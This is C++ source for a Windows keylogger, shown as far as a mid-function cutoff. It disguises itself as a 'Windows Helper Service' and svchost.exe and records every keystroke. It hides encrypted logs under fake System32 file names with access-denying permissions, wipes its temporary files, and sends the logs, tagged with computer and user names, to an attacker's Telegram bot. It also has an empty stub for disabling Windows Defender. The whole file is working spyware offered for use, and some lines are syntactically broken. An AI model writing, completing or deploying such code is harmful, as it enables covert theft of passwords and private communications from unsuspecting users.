#include <windows.h>
#include <string>
#include <ctime>
#include <sstream>
#include <thread>
#include <mutex>
#include <atomic>
#include <iomanip>
#include <vector>
#include <fstream>
#include <winhttp.h>
#include <deque>
#include <Aclapi.h>
#include <Sddl.h>
#include <wincrypt.h>
#include <wininet.h>
#include <TlHelp32.h>
#include <Psapi.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")


#define SERVICE_NAME L"WindowsHelperSvc"
#define SERVICE_DISPLAY_NAME L"Windows Helper Service"
#define SERVICE_DESCRIPTION L"Handles Windows update and other Microsoft applications" 


#define TELEGRAM_BOT_TOKEN "YOUR_TOKEN_HERE" // CHANGE THIS
#define TELEGRAM_CHAT_ID "YOUR_CHAT_ID_HERE" // CHANGE THIS
#define BUFFER_SIZE_THRESHOLD 3000  
#define SECURE_LOG_KEY "SEc+VR3=K3y!"  // to crypt logs stored, you can generate it at runtime
#define HEARTBEAT_INTERVAL 3600       
#define LOW_CPU_PRIORITY_THRESHOLD 80 


SERVICE_STATUS g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
std::atomic<bool> g_Running(false);
std::mutex g_BufferMutex;
std::mutex g_BacklogMutex;
std::thread g_KeyloggerThread;
std::thread g_StealthThread;
std::vector<int> g_LastKeyPressTime(256, 0);
time_t g_LastActivityTime;
std::string g_Buffer;
bool g_NewLineNeeded = true;
std::deque<std::string> g_PendingEntries;
std::string g_ComputerName;
std::string g_SecureLogPath;
HANDLE g_ProcessHeap;


const int KEY_REPEAT_THRESHOLD_MS = 50;          
const int INACTIVITY_TIMEOUT_S = 5;
const int CONNECTION_CHECK_INTERVAL_S = 60;
const int KEYLOG_PRIORITY_CLASS = IDLE_PRIORITY_CLASS


void WINAPI ServiceMain(DWORD argc, LPWSTR* argv);
void WINAPI ServiceCtrlHandler(DWORD);
void StartKeylogger();
void StopKeylogger();
void KeyloggerThreadFunction();
void LogKey(int key);
std::string GetTimeString();
std::string GetKeyName(int key);
bool SendFileToTelegram(const std::string& filePath);
void FlushBuffer();
std::wstring StringToWString(const std::string& str);
std::string UrlEncode(const std::string& str);
bool CheckInternetConnection();
void ProcessPendingEntries();
std::string GetSecureLogPath();
void CreateProtectedLogFile(const std::string& path);
void WriteToSecureLog(const std::string& data);
std::vector<char> EncryptData(const std::string& data);
void EnsureDirectoryExists(const std::string& path);
std::string GetComputerName();
bool SetFileHiddenSystemAttribs(const std::string& path);
bool DenyFileAccess(const std::string& filePath);
BOOL InstallService();
BOOL UninstallService();
void StealthModeThread();
void AdjustProcessPriority();
void ModifyProcessName(const wchar_t* newName);
void ClearMemory(void* ptr, size_t size);
void DisableWindowsDefender();
void WipeFileFromDisk(const std::string& path);
void SecureCleanupAtExit();
bool SplitAndSendLargeFile(const std::string& filePath);
bool SendSingleFileToTelegram(const std::string& filePath, const std::string& caption);


template<typename T>
void SecureString(T& str) {
    if (str.capacity() > str.size()) {
        T(str).swap(str);
    }
}

int main(int argc, char* argv[]) {
    
    ModifyProcessName(L"svchost.exe");
    
    
    g_ProcessHeap = HeapCreate(HEAP_NO_SERIALIZE, 1024 * 1024, 0);
    
    
    atexit(SecureCleanupAtExit);
    
    
    SetPriorityClass(GetCurrentProcess(), KEYLOG_PRIORITY_CLASS);

    
    if (argc > 1 && std::string(argv[1]) == "install") {
        if (InstallService()) {
            return 0;
        } else {
            return 1;
        }
    }
    
    
    if (argc > 1 && std::string(argv[1]) == "uninstall") {
        if (UninstallService()) {
            return 0;
        } else {
            return 1;
        }
    }
    
    
    if (argc > 1 && std::string(argv[1]) == "console") {
        g_Running = true;
        KeyloggerThreadFunction();
        return 0;
    }

    
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {const_cast<LPWSTR>(SERVICE_NAME), (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        return GetLastError();
    }
    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    StartKeylogger();
    
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    
    HANDLE hStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    while (g_Running) {
        
        WaitForSingleObject(hStopEvent, 100);
    }
    CloseHandle(hStopEvent);

    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

void WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
    switch (ctrlCode) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        StopKeylogger();
        break;
    }
}

void StartKeylogger() {
    
    g_ComputerName = GetComputerName();
    
    
    g_SecureLogPath = GetSecureLogPath();
    
    
    CreateProtectedLogFile(g_SecureLogPath);
    
    
    g_StealthThread = std::thread(StealthModeThread);
    g_StealthThread.detach();
    
    
    g_Running = true;
    g_KeyloggerThread = std::thread(KeyloggerThreadFunction);
    g_KeyloggerThread.detach();
}

void StopKeylogger() {
    g_Running = false;
    if (!g_Buffer.empty()) FlushBuffer();
}


void StealthModeThread() {
    time_t lastHeartbeat = time(NULL);
    
    
    while (g_Running) {
        
        time_t currentTime = time(NULL);
        if (difftime(currentTime, lastHeartbeat) >= HEARTBEAT_INTERVAL) {
            lastHeartbeat = currentTime;
            
            
            AdjustProcessPriority();
        }
        
        
        Sleep(30000);  
    }
}


void ModifyProcessName(const wchar_t* newName) {
    
    
    SetConsoleTitle(newName);
}


void AdjustProcessPriority() {
    FILETIME idleTime, kernelTime, userTime;
    static FILETIME lastIdleTime = {0}, lastKernelTime = {0}, lastUserTime = {0};
    
    if (GetSystemTimes(&idleTime, &kernelTime, &userTime)) {
        ULARGE_INTEGER idle, kernel, user, idleDiff, kernelDiff, userDiff;
        
        idle.LowPart = idleTime.dwLowDateTime;
        idle.HighPart = idleTime.dwHighDateTime;
        kernel.LowPart = kernelTime.dwLowDateTime;
        kernel.HighPart = kernelTime.dwHighDateTime;
        user.LowPart = userTime.dwLowDateTime;
        user.HighPart = userTime.dwHighDateTime;
        
        if (lastIdleTime.dwLowDateTime != 0) {
            ULARGE_INTEGER lastIdle, lastKernel, lastUser;
            
            lastIdle.LowPart = lastIdleTime.dwLowDateTime;
            lastIdle.HighPart = lastIdleTime.dwHighDateTime;
            lastKernel.LowPart = lastKernelTime.dwLowDateTime;
            lastKernel.HighPart = lastKernelTime.dwHighDateTime;
            lastUser.LowPart = lastUserTime.dwLowDateTime;
            lastUser.HighPart = lastUserTime.dwHighDateTime;
            
            idleDiff.QuadPart = idle.QuadPart - lastIdle.QuadPart;
            kernelDiff.QuadPart = kernel.QuadPart - lastKernel.QuadPart;
            userDiff.QuadPart = user.QuadPart - lastUser.QuadPart;
            
            ULONGLONG totalDiff = kernelDiff.QuadPart + userDiff.QuadPart;
            ULONGLONG cpuUsage = (totalDiff - idleDiff.QuadPart) * 100 / totalDiff;
            
            
            if (cpuUsage > LOW_CPU_PRIORITY_THRESHOLD) {
                SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
            } else {
                SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
            }
        }
        
        lastIdleTime = idleTime;
        lastKernelTime = kernelTime;
        lastUserTime = userTime;
    }
}


void DisableWindowsDefender() {
    
    
    
    
}

void KeyloggerThreadFunction() {
    g_LastActivityTime = time(NULL);
    time_t lastConnectionCheck = time(NULL);
    
    
    std::string initMsg = "Keylogger started on: " + g_ComputerName + " at " + GetTimeString();
    WriteToSecureLog(initMsg);
    
    
    {
        std::lock_guard<std::mutex> backlogLock(g_BacklogMutex);
        g_PendingEntries.push_back(initMsg);
    }

    
    if (CheckInternetConnection()) {
        ProcessPendingEntries();
    }

    
    const int checkInterval = 300; 
    int loopCounter = 0;
    int keysPressed = 0;

    while (g_Running) {
        loopCounter++;
        
        
        if (loopCounter % checkInterval == 0) {
            time_t currentTime = time(NULL);
            
            
            if (difftime(currentTime, lastConnectionCheck) >= CONNECTION_CHECK_INTERVAL_S) {
                lastConnectionCheck = currentTime;
                if (CheckInternetConnection()) {
                    ProcessPendingEntries();
                }
            }
    
            
            if (difftime(currentTime, g_LastActivityTime) >= INACTIVITY_TIMEOUT_S && !g_Buffer.empty()) {
                FlushBuffer();
            }
            
            
            if (g_Buffer.size() > BUFFER_SIZE_THRESHOLD) {
                FlushBuffer();
            }
        }

        
        bool activityDetected = false;
        
        
        for (int key = 8; key <= 190; key++) {
            
            if (GetAsyncKeyState(key) & 0x8000) {
                int lastPressTime = g_LastKeyPressTime[key];
                int currentTickCount = GetTickCount64();
                bool shouldLog = true;

                if (lastPressTime > 0 && (currentTickCount - lastPressTime) < KEY_REPEAT_THRESHOLD_MS) {
                    shouldLog = false;
                }

                g_LastKeyPressTime[key] = currentTickCount;

                if (shouldLog) {
                    LogKey(key);
                    activityDetected = true;
                    keysPressed++;
                }
            }
        }

        if (activityDetected) {
            g_LastActivityTime = time(NULL);
        }
        
        
        Sleep(10);
    }

    
    if (!g_Buffer.empty()) {
        FlushBuffer();
    }

    
    std::string finalMsg = "Keylogger stopped on: " + g_ComputerName + " at " + GetTimeString() + 
                           ". Tasti registrati: " + std::to_string(keysPressed);
    WriteToSecureLog(finalMsg);
    
    
    {
        std::lock_guard<std::mutex> backlogLock(g_BacklogMutex);
        g_PendingEntries.push_back(finalMsg);
        
        
        ProcessPendingEntries();
    }
}

void LogKey(int key) {
    std::string keyName = GetKeyName(key);
    if (keyName.empty()) return;

    std::lock_guard<std::mutex> lock(g_BufferMutex);
    
    if (g_NewLineNeeded) {
        g_Buffer += "[" + GetTimeString() + "] ";
        g_NewLineNeeded = false;
    }
    
    g_Buffer += keyName;
}

void FlushBuffer() {
    std::lock_guard<std::mutex> lock(g_BufferMutex);
    if (!g_Buffer.empty()) {
        
        WriteToSecureLog(g_Buffer);
        
        
        {
            std::lock_guard<std::mutex> backlogLock(g_BacklogMutex);
            g_PendingEntries.push_back(g_Buffer);
        }
        
        g_Buffer.clear();
    }
    g_NewLineNeeded = true;
}


void ClearMemory(void* ptr, size_t size) {
    volatile char* p = (volatile char*)ptr;
    while (size--) {
        *p++ = 0;
    }
}


void SecureCleanupAtExit() {
    
    g_Buffer.clear();
    SecureString(g_Buffer);
    
    
    if (g_ProcessHeap) {
        HeapDestroy(g_ProcessHeap);
    }
}


void WipeFileFromDisk(const std::string& path) {
    
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize != INVALID_FILE_SIZE) {
            const int BUFFER_SIZE = 4096;
            char buffer[BUFFER_SIZE];
            
            for (int i = 0; i < 3; i++) {  
                switch (i) {
                    case 0: memset(buffer, 0xFF, BUFFER_SIZE); break;  
                    case 1: memset(buffer, 0x00, BUFFER_SIZE); break;  
                    case 2:  
                        for (int j = 0; j < BUFFER_SIZE; j++) {
                            buffer[j] = rand() % 256;
                        }
                        break;
                }
                
                DWORD bytesWritten = 0;
                SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
                
                for (DWORD remaining = fileSize; remaining > 0;) {
                    DWORD toWrite = min(BUFFER_SIZE, remaining);
                    WriteFile(hFile, buffer, toWrite, &bytesWritten, NULL);
                    remaining -= bytesWritten;
                }
                
                FlushFileBuffers(hFile);
            }
        }
        CloseHandle(hFile);
    }
    
    
    DeleteFileA(path.c_str());
}

std::string GetTimeString() {
    auto now = std::time(nullptr);
    auto tm = *std::localtime(&now);
    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

std::string GetKeyName(int key) {
    
    bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
    
    
    switch (key) {
    case VK_BACK:       return "[BACKSPACE]";
    case VK_RETURN:     return "[ENTER]";
    case VK_SPACE:      return " ";
    case VK_TAB:        return "[TAB]";
    case VK_SHIFT:      return "[SHIFT]";
    case VK_CONTROL:    return "[CTRL]";
    case VK_MENU:       return "[ALT]";
    case VK_ESCAPE:     return "[ESC]";
    case VK_END:        return "[END]";
    case VK_HOME:       return "[HOME]";
    case VK_LEFT:       return "[LEFT]";
    case VK_RIGHT:      return "[RIGHT]";
    case VK_UP:         return "[UP]";
    case VK_DOWN:       return "[DOWN]";
    case VK_PRIOR:      return "[PGUP]";
    case VK_NEXT:       return "[PGDN]";
    case VK_INSERT:     return "[INS]";
    case VK_DELETE:     return "[DEL]";
    case VK_CAPITAL:    return "[CAPS]";
    case VK_LWIN:       return "[WIN]";
    case VK_RWIN:       return "[WIN]";
    case VK_SNAPSHOT:   return "[PRTSC]";
    case VK_SCROLL:     return "[SCROLL]";
    case VK_PAUSE:      return "[PAUSE]";
    }

    
    if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9')) {
        if (key >= 'A' && key <= 'Z') {
            bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            if (capsLock != shift) {
                return std::string(1, static_cast<char>(key));
            } else {
                return std::string(1, static_cast<char>(key + 32));
            }
        } else {
            if (shift) {
                switch (key) {
                    case '0': return ")";
                    case '1': return "!";
                    case '2': return "@";
                    case '3': return "#";
                    case '4': return "$";
                    case '5': return "%";
                    case '6': return "^";
                    case '7': return "&";
                    case '8': return "*";
                    case '9': return "(";
                    default: return std::string(1, static_cast<char>(key));
                }
            } else {
                return std::string(1, static_cast<char>(key));
            }
        }
    }

    
    if (key >= VK_NUMPAD0 && key <= VK_NUMPAD9) {
        return std::to_string(key - VK_NUMPAD0);
    }

    
    switch (key) {
        case VK_MULTIPLY:  return "*";
        case VK_ADD:       return "+";
        case VK_SEPARATOR: return "Enter";
        case VK_SUBTRACT:  return "-";
        case VK_DECIMAL:   return ".";
        case VK_DIVIDE:    return "/";
    }

    
    if (key >= VK_F1 && key <= VK_F24) {
        return "[F" + std::to_string(key - VK_F1 + 1) + "]";
    }

    
    switch (key) {
        case VK_OEM_1:      return shift ? ":" : ";";
        case VK_OEM_PLUS:   return shift ? "+" : "=";
        case VK_OEM_COMMA:  return shift ? "<" : ",";
        case VK_OEM_MINUS:  return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2:      return shift ? "?" : "/";
        case VK_OEM_3:      return shift ? "~" : "`";
        case VK_OEM_4:      return shift ? "{" : "[";
        case VK_OEM_5:      return shift ? "|" : "\\";
        case VK_OEM_6:      return shift ? "}" : "]";
        case VK_OEM_7:      return shift ? "\"" : "'";
    }

    return "";
}


std::wstring StringToWString(const std::string& str) {
    if (str.empty()) return L"";
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}


std::string UrlEncode(const std::string& str) {
    std::string encoded;
    for (char c : str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded += c;
        } else if (c == ' ') {
            encoded += "%20";
        } else {
            char buf[4];
            sprintf_s(buf, "%%%02X", (unsigned char)c);
            encoded += buf;
        }
    }
    return encoded;
}


bool CheckInternetConnection() {
    DWORD flags = 0;
    bool connected = InternetGetConnectedState(&flags, 0) == TRUE;
    
    
    if (connected) {
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", 
                                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                        WINHTTP_NO_PROXY_NAME, 
                                        WINHTTP_NO_PROXY_BYPASS, 0);
        if (hSession) {
            HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org",
                                               INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (hConnect) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return true;
            }
            WinHttpCloseHandle(hSession);
        }
    }
    
    return connected;
}


std::string GetSecureLogPath() {
    
    char systemDir[MAX_PATH];
    GetSystemDirectoryA(systemDir, MAX_PATH);
    
    
    const char* possiblePaths[] = {
        "\\drivers\\etc\\hosts.cache",         
        "\\wbem\\logs\\setup.ini",             
        "\\com\\complus.cfg",                  
        "\\catroot\\Settings.dat"              
    };
    
    
    std::string hiddenDir = std::string(systemDir) + possiblePaths[GetTickCount64() % 4];
    
    
    std::string dirPath = hiddenDir.substr(0, hiddenDir.find_last_of("\\/"));
    EnsureDirectoryExists(dirPath);
    
    return hiddenDir;
}


void CreateProtectedLogFile(const std::string& path) {
    
    HANDLE hFile = CreateFileA(
        path.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0, 
        NULL, 
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        
        
        SetFileHiddenSystemAttribs(path);
        
        
        DenyFileAccess(path);
    }
}


void WriteToSecureLog(const std::string& data) {
    try {
        
        std::vector<char> encryptedData = EncryptData(data);
        
        
        HANDLE hFile = CreateFileA(
            g_SecureLogPath.c_str(),
            FILE_APPEND_DATA,
            0, 
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            
            SetFilePointer(hFile, 0, NULL, FILE_END);
            
            
            DWORD bytesWritten = 0;
            if (WriteFile(hFile, encryptedData.data(), (DWORD)encryptedData.size(), &bytesWritten, NULL)) {
                
                const char newline[] = "\r\n";
                WriteFile(hFile, newline, 2, &bytesWritten, NULL);
                
                
                FlushFileBuffers(hFile);
            }
            
            CloseHandle(hFile);
        }
    } catch (...) {
        
    }
}


std::vector<char> EncryptData(const std::string& data) {
    
    std::vector<char> encrypted(data.size());
    for (size_t i = 0; i < data.size(); i++) {
        encrypted[i] = data[i] ^ SECURE_LOG_KEY[i % strlen(SECURE_LOG_KEY)];
    }
    return encrypted;
}


bool SetFileHiddenSystemAttribs(const std::string& path) {
    DWORD attrs = GetFileAttributesA(path.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) return false;
    
    return SetFileAttributesA(path.c_str(), 
        attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);
}


bool DenyFileAccess(const std::string& filePath) {
    PSECURITY_DESCRIPTOR pSD = NULL;
    PACL pDacl = NULL;
    bool success = false;
    
    
    wchar_t everyoneBuffer[32] = L"Everyone";
    wchar_t systemBuffer[32] = L"SYSTEM";
    
    try {
        
        pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
        if (!pSD) return false;
        
        if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
            return false;
        
            
    EXPLICIT_ACCESSW ea[2];
    ZeroMemory(ea, sizeof(ea));
        
        
        BuildExplicitAccessWithNameW(&ea[0], everyoneBuffer, 0, DENY_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);
        
        
        BuildExplicitAccessWithNameW(&ea[1], systemBuffer, GENERIC_ALL, GRANT_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);
        
        if (SetEntriesInAclW(2, ea, NULL, &pDacl) != ERROR_SUCCESS)
            return false;
        
        
        if (!SetSecurityDescriptorDacl(pSD, TRUE, pDacl, FALSE))
            return false;
        
        
        success = SetFileSecurityW(StringToWString(filePath).c_str(), 
                                 DACL_SECURITY_INFORMATION, 
                                 pSD) == ERROR_SUCCESS;
    } catch (...) {
        success = false;
    }
    
    
    if (pDacl) LocalFree(pDacl);
    if (pSD) LocalFree(pSD);
    
    return success;
}


void ProcessPendingEntries() {
    std::lock_guard<std::mutex> lock(g_BacklogMutex);
    
    
    if (g_PendingEntries.empty()) return;
    
    
    const size_t maxEntriesToProcess = 50;
    size_t entriesToProcess = min(g_PendingEntries.size(), maxEntriesToProcess);
    
    
    std::string tempDir = std::string(getenv("TEMP"));
    std::string tempFile = tempDir + "\\~tmpsend_" + std::to_string(GetTickCount64()) + ".tmp";
    
    
    std::ofstream outFile(tempFile);
    if (!outFile.is_open()) return;
    
    
    for (size_t i = 0; i < entriesToProcess; i++) {
        outFile << g_PendingEntries[i] << std::endl;
    }
    outFile.close();
    
    
    struct stat fileStats;
    if (stat(tempFile.c_str(), &fileStats) != 0 || fileStats.st_size == 0) {
        DeleteFileA(tempFile.c_str());
        return;
    }
    
    
    bool sent = SendFileToTelegram(tempFile);
    
    if (sent) {
        
        g_PendingEntries.erase(g_PendingEntries.begin(), g_PendingEntries.begin() + entriesToProcess);
    }
    
    
    DeleteFileA(tempFile.c_str());
}


std::string ReadAndDecryptLog() {
    std::string decryptedContent;
    HANDLE hFile = CreateFileA(
        g_SecureLogPath.c_str(),
        GENERIC_READ,
        0,  
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
        
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
            
            std::vector<char> buffer(fileSize);
            DWORD bytesRead;
            
            if (ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL) && bytesRead > 0) {
                
                std::string decrypted;
                decrypted.resize(bytesRead);
                
                for (size_t i = 0; i < bytesRead; i++) {
                    decrypted[i] = buffer[i] ^ SECURE_LOG_KEY[i % strlen(SECURE_LOG_KEY)];
                }
                
                decryptedContent = decrypted;
            }
        }
        CloseHandle(hFile);
    }
    
    return decryptedContent;
}


std::string GenerateUniqueFilename() {
    
    time_t now = time(nullptr);
    time_t time = now;
    struct tm timeinfo;
    localtime_s(&timeinfo, &time);
    
    
    char timeBuffer[80];
    strftime(timeBuffer, sizeof(timeBuffer), "%Y%m%d_%H%M%S", &timeinfo);
    
    
    char username[256];
    DWORD usernameSize = sizeof(username);
    GetUserNameA(username, &usernameSize);
    
    
    std::string uniqueFile = g_ComputerName + "_" + std::string(username) + "_" + 
                            std::string(timeBuffer) + ".txt";
    
    
    for (char& c : uniqueFile) {
        if (c == ' ' || c == ':' || c == '\\' || c == '/' || c == '*' || c == '?' || c == '"' || c == '<' || c == '>' || c == '|') {
            c = '_';
        }
    }
    
    return uniqueFile;
}


bool SendFileToTelegram(const std::string& filePath) {
    if (!CheckInternetConnection()) {
        return false;
    }
    
    
    struct stat fileStats;
    if (stat(filePath.c_str(), &fileStats) != 0) {
        return false;
    }
    
    
    if (fileStats.st_size > 45 * 1024 * 1024 || fileStats.st_size == 0) {
        return false;
    }

    bool result = false;
    DWORD dwStatusCode = 0;
    DWORD dwStatusCodeSize = sizeof(dwStatusCode);
    
    
    std::wstring host = L"api.telegram.org";
    std::wstring method = L"sendDocument";
    std::string apiPath = "/bot" + std::string(TELEGRAM_BOT_TOKEN) + "/" + std::string(method.begin(), method.end());
    
    
    std::ifstream fileStream(filePath, std::ios::binary);
    if (!fileStream) {
        return false;
    }
    
    
    size_t fileSize = static_cast<size_t>(fileStats.st_size);
    const size_t maxBufferSize = 1024 * 1024
    size_t actualSize = min(fileSize, maxBufferSize);
    
    
    std::vector<char> fileData(actualSize);
    fileStream.read(fileData.data(), actualSize);
    fileStream.close();
    
    
    std::string boundary = "------------------------" + std::to_string(GetTickCount64());
    std::string headerContentType = "Content-Type: multipart/form-data; boundary=" + boundary;
    
    
    std::string body = "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
    body += TELEGRAM_CHAT_ID;
    body += "\r\n--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + GenerateUniqueFilename() + "\"\r\n";
    body += "Content-Type: text/plain\r\n\r\n";
    
    
    std::vector<char> requestBody;
    requestBody.reserve(body.size() + fileData.size() + 50);
    requestBody.insert(requestBody.end(), body.begin(), body.end());
    requestBody.insert(requestBody.end(), fileData.begin(), fileData.end());
    
    std::string endBoundary = "\r\n--" + boundary + "--\r\n";
    requestBody.insert(requestBody.end(), endBoundary.begin(), endBoundary.end());
    
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", 
                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME, 
                                    WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (!hSession) {
        return false;
    }
    
    
    DWORD timeout = 5000
    WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    
    
    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(),
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", StringToWString(apiPath).c_str(),
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
                                          WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    
    
    if (!WinHttpAddRequestHeaders(hRequest, StringToWString(headerContentType).c_str(), -1L, 
                                 WINHTTP_ADDREQ_FLAG_ADD)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    if (!WinHttpSendRequest(hRequest, 
                           WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           (LPVOID)requestBody.data(), 
                           (DWORD)requestBody.size(), 
                           (DWORD)requestBody.size(), 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                          NULL, &dwStatusCode, &dwStatusCodeSize, NULL)) {
        result = (dwStatusCode >= 200 && dwStatusCode < 300);
    }
    
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}


bool SplitAndSendLargeFile(const std::string& filePath) {
    const size_t MAX_CHUNK_SIZE = 40 * 1024 * 1024
    
    
    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return false;
    
    
    inFile.seekg(0, std::ios::end);
    size_t totalSize = inFile.tellg();
    inFile.seekg(0, std::ios::beg);
    
    
    size_t totalChunks = (totalSize + MAX_CHUNK_SIZE - 1) / MAX_CHUNK_SIZE;
    bool allSuccessful = true;
    
    
    for (size_t i = 0; i < totalChunks; i++) {
        
        std::string chunkFile = std::string(getenv("TEMP")) + "\\~chunk_" + 
                              std::to_string(i + 1) + "_of_" + std::to_string(totalChunks) + 
                              "_" + std::to_string(GetTickCount64()) + ".tmp";
        
        
        size_t chunkSize = min(MAX_CHUNK_SIZE, totalSize - (i * MAX_CHUNK_SIZE));
        
        
        std::vector<char> buffer(chunkSize);
        inFile.read(buffer.data(), chunkSize);
        
        std::ofstream outFile(chunkFile, std::ios::binary);
        if (outFile) {
            outFile.write(buffer.data(), chunkSize);
            outFile.close();
            
            
            if (!SendSingleFileToTelegram(chunkFile, "Part " + std::to_string(i + 1) + 
                                       " of " + std::to_string(totalChunks))) {
                allSuccessful = false;
            }
            
            
            WipeFileFromDisk(chunkFile);
        } else {
            allSuccessful = false;
        }
    }
    
    inFile.close();
    return allSuccessful;
}


bool SendSingleFileToTelegram(const std::string& filePath, const std::string& caption) {
    if (!CheckInternetConnection()) {
        return false;
    }

    bool result = false;
    DWORD dwStatusCode = 0;
    DWORD dwStatusCodeSize = sizeof(dwStatusCode);
    
    
    std::wstring host = L"api.telegram.org";
    std::wstring method = L"sendDocument";
    std::string apiPath = "/bot" + std::string(TELEGRAM_BOT_TOKEN) + "/" + std::string(method.begin(), method.end());
    
    
    std::ifstream fileStream(filePath, std::ios::binary);
    if (!fileStream) {
        return false;
    }
    
    fileStream.seekg(0, std::ios::end);
    std::streampos fileSize = fileStream.tellg();
    fileStream.seekg(0, std::ios::beg);
    
    std::vector<char> fileData(fileSize);
    fileStream.read(fileData.data(), fileSize);
